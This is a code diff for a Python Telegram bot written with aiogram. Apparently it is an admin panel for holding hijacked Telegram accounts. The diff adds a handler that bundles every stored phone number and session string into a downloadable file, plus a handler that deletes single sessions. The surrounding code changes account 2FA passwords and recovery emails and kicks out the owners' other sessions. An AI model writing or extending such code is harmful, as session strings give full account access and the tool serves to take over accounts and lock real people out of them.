@@ -1,8 +1,7 @@
-# main.py — النسخة المدمجة والمصححة
 import asyncio
 import logging
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, Contact
+from aiogram.types import Message, CallbackQuery, Contact, BufferedInputFile
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
@@ -436,11 +435,10 @@ async def back_to_sessions(callback: CallbackQuery):
 
 
 # ──────────────────────────────────────────
-# سحب كود الجلسة نصياً
+# سحب الجلسات (نصي وملف)
 # ──────────────────────────────────────────
-@dp.callback_query(F.data.startswith("export_"))
+@dp.callback_query(F.data.startswith("export_") and ~F.data.startswith("export_all"))
 async def export_session_text(callback: CallbackQuery):
-    # إصلاح: فحص is_admin كان مفقوداً
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -457,12 +455,78 @@ async def export_session_text(callback: CallbackQuery):
     await callback.answer()
 
 
+@dp.callback_query(F.data == "export_all_txt")
+async def export_all_sessions_txt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+
+    sessions = await database.get_all_sessions()
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات في قاعدة البيانات.", show_alert=True)
+        return
+
+    await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات...", parse_mode="HTML")
+
+    lines = []
+    for s in sessions:
+        if s["session_string"]:
+            lines.append(f"{s['phone']}:{s['session_string']}")
+
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة لإرسالها.")
+        return
+
+    # إنشاء الملف النصي في الذاكرة
+    file_content = "\n".join(lines).encode('utf-8')
+    document = BufferedInputFile(file_content, filename="all_sessions.txt")
+
+    await callback.message.answer_document(
+        document=document,
+        caption="📥 <b>ملف جميع الجلسات (رقم:كود)</b>" + ADMIN_FOOTER,
+        parse_mode="HTML"
+    )
+
+    # إعادة لوحة التحكم الرئيسية بعد الإرسال
+    count = await database.get_sessions_count()
+    text = (
+        f"👋 أهلاً بالقيادة!\n\n"
+        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
+        + ADMIN_FOOTER
+    )
+    await callback.message.edit_text(text, reply_markup=sessions_keyboard(sessions), parse_mode="HTML")
+
+
+# ──────────────────────────────────────────
+# حذف جلسة فردية نهائياً
+# ──────────────────────────────────────────
+@dp.callback_query(F.data.startswith("del_session_"))
+async def delete_single_session(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    phone = callback.data[12:]
+    await database.delete_session(phone)
+    await callback.answer(f"✅ تم حذف الحساب {phone} نهائياً من القاعدة.", show_alert=True)
+    
+    # تحديث القائمة
+    sessions = await database.get_all_sessions()
+    count    = await database.get_sessions_count()
+    text = (
+        f"👋 أهلاً بالقيادة!\n\n"
+        f"هذه الحسابات المتوفرة حالياً، عددهم: <b>{count}</b>"
+        + ADMIN_FOOTER
+    )
+    kb = sessions_keyboard(sessions) if sessions else None
+    suffix = "" if sessions else "\n\n📭 لا توجد جلسات."
+    await callback.message.edit_text(text + suffix, reply_markup=kb, parse_mode="HTML")
+
+
 # ──────────────────────────────────────────
 # تصفير عداد العمليات
 # ──────────────────────────────────────────
 @dp.callback_query(F.data == "reset_mail_mem")
 async def reset_counter(callback: CallbackQuery):
-    # إصلاح: فحص is_admin كان مفقوداً
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -475,7 +539,6 @@ async def reset_counter(callback: CallbackQuery):
 # ──────────────────────────────────────────
 @dp.callback_query(F.data.startswith("ch_mail_"))
 async def auto_mail_process(callback: CallbackQuery):
-    # إصلاح: فحص is_admin كان مفقوداً
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -485,7 +548,6 @@ async def auto_mail_process(callback: CallbackQuery):
         parse_mode="HTML"
     )
 
-    # إصلاح: BASE_EMAIL مستورد مباشرة من config
     count     = await database.increment_email_counter()
     name, domain = BASE_EMAIL.split("@", 1)
     new_email = f"{name}+{count}@{domain}"
@@ -771,7 +833,6 @@ async def process_2fa_change(message: Message, state: FSMContext):
 # ──────────────────────────────────────────
 @dp.callback_query(F.data.startswith("full_kick_"))
 async def admin_full_cleanup(callback: CallbackQuery):
-    # إصلاح: فحص is_admin كان مفقوداً
     if not is_admin(callback.from_user.id):
         await callback.answer()
         return
@@ -787,7 +848,6 @@ async def admin_full_cleanup(callback: CallbackQuery):
     res1 = await session_manager.full_clean_and_kick(phone, new_pw)
 
     # 2. تغيير البريد تلقائياً
-    # إصلاح: BASE_EMAIL مستورد مباشرة من config
     count     = await database.increment_email_counter()
     name, domain = BASE_EMAIL.split("@", 1)
     new_email = f"{name}+{count}@{domain}"
@@ -811,7 +871,6 @@ async def admin_full_cleanup(callback: CallbackQuery):
         parse_mode="HTML",
         reply_markup=back_to_session_keyboard(phone)
     )
-    # إصلاح: callback.answer() كان مفقوداً
     await callback.answer()
 
 
@@ -820,7 +879,6 @@ async def admin_full_cleanup(callback: CallbackQuery):
 # ──────────────────────────────────────────
 async def main():
     await database.init_db()
-    # إصلاح: asyncio.create_task يعمل فقط داخل event loop نشط
     asyncio.ensure_future(session_watchdog())
     await dp.start_polling(bot)
 
